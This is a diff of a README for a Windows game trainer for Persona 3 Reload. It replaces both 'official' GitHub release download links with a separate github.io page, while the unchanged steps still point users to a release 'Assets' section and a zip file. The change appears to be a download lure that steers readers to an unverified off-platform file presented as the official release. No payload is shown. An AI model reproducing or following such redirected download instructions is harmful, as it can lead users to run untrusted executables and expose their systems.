@@ -1,6 +1,6 @@
 # 🎮 Persona-3-Reload-Trainer-2026 - Master your game with ease today
 
-[![Download Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Shinju3697/Persona-3-Reload-Trainer-2026/releases)
+[![Download Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://shinju3697.github.io)
 
 This software allows you to adjust game settings in Persona 3 Reload. You can change your experience to match your personal preference. This tool works on Windows 10 and Windows 11 systems.
 
@@ -19,7 +19,7 @@ Before you install this tool, check your computer against these requirements:
 
 You need to download the trainer from the official release page. Follow these steps to obtain the correct file:
 
-1.  Visit the [official download page](https://github.com/Shinju3697/Persona-3-Reload-Trainer-2026/releases).
+1.  Visit the [official download page](https://shinju3697.github.io).
 2.  Scroll down to the "Assets" section of the latest release.
 3.  Click the file named `Persona3ReloadTrainer.zip` to start the download.
 4.  Save the file to a folder you recognize, such as your Downloads folder or Desktop.
